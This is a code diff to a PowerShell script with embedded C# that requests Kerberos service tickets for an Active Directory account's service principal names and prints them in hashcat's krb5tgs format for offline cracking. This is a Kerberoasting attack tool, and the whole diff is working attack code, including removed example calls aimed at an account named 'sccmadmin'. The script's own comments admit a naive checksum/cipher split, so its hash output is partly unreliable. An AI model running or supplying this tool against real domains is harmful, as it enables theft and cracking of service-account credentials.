@@ -57,7 +57,7 @@ public class K {
         try {
             SecBuffer secBuf = new SecBuffer();
             secBuf.BufferType = 2; // SECBUFFER_TOKEN
-            secBuf.cbBuffer = 12288;
+            secBuf.cbBuffer = 12288; // 12KB
             secBuf.pvBuffer = Marshal.AllocHGlobal((int)secBuf.cbBuffer);
 
             IntPtr pSecBuf = Marshal.AllocHGlobal(Marshal.SizeOf(secBuf));
@@ -71,7 +71,7 @@ public class K {
             if (AcquireCredentialsHandle(
                     null,
                     "Kerberos",
-                    0x00000002,
+                    0x00000002, // SECPKG_CRED_OUTBOUND
                     IntPtr.Zero,
                     IntPtr.Zero,
                     IntPtr.Zero,
@@ -84,7 +84,7 @@ public class K {
                     ref cred,
                     IntPtr.Zero,
                     spn,
-                    0x00001000,
+                    0x00001000, // ISC_REQ_ALLOCATE_MEMORY
                     0,
                     16,
                     IntPtr.Zero,
@@ -100,7 +100,7 @@ public class K {
                 return null;
 
             byte[] data = new byte[resultBuf.cbBuffer];
-            Marshal.Copy(resultBuf.pvBuffer, data, 0, data.Length);
+            System.Runtime.InteropServices.Marshal.Copy(resultBuf.pvBuffer, data, 0, data.Length);
             return data;
         } finally {
             if (cred != IntPtr.Zero) FreeCredentialsHandle(cred);
@@ -110,12 +110,14 @@ public class K {
 "@
 
 function Get-KerberosTicketHashcatFormat {
+    [CmdletBinding()]
     param(
         [Parameter(Mandatory)]
         [string]$SamAccountName,
 
+        # You provide the etype manually: 23 (RC4), 17 (AES128), 18 (AES256), etc.
         [Parameter(Mandatory)]
-        [string]$Etype  # <-- you provide this manually: 23 / 17 / 18
+        [string]$Etype
     )
 
     $user = Get-ADUser -Filter "samaccountname -eq '$SamAccountName'" -Properties servicePrincipalName
@@ -134,14 +136,20 @@ function Get-KerberosTicketHashcatFormat {
                 continue
             }
 
+            # Raw ticket as hex
             $ticketHex = [BitConverter]::ToString($ticketBytes).Replace("-", "")
-            $checksumHex = $ticketHex.Substring(0, 32)
-            $cipherHex = $ticketHex.Substring(32)
 
-            $realm = $env:USERDNSDOMAIN
+            # Naive split: first 16 bytes as "checksum", rest as "cipher"
+            # (Good enough for many RC4 cases; for AES, a proper ASN.1 parse is ideal.)
+            $checksumHex = $ticketHex.Substring(0, 32)
+            $cipherHex   = $ticketHex.Substring(32)
+
+            $realm        = $env:USERDNSDOMAIN
             $spnSanitized = $spn.Replace(":", "~")
 
-            $hashcat = "`$krb5tgs$${Etype}*${SamAccountName}\$${realm}\$${spnSanitized}*${checksumHex}\$${cipherHex}"
+            # Build the hashcat line by concatenation so variables expand, while literal '$' separators remain.
+            $prefix  = "`$krb5tgs$"         # literally: $krb5tgs$
+            $hashcat = $prefix + $Etype + "*" + $SamAccountName + "`$" + $realm + "`$" + $spnSanitized + "*" + $checksumHex + "`$" + $cipherHex
 
             Write-Host "`n[+] Hashcat Format:`n${hashcat}`n"
         }
@@ -150,14 +158,3 @@ function Get-KerberosTicketHashcatFormat {
         }
     }
 }
-
-
-
-# For RC4-HMAC
-#Get-KerberosTicketHashcatFormat -SamAccountName "sccmadmin" -Etype 23
-
-# For AES128
-#Get-KerberosTicketHashcatFormat -SamAccountName "sccmadmin" -Etype 17
-
-# For AES256
-#Get-KerberosTicketHashcatFormat -SamAccountName "sccmadmin" -Etype 18
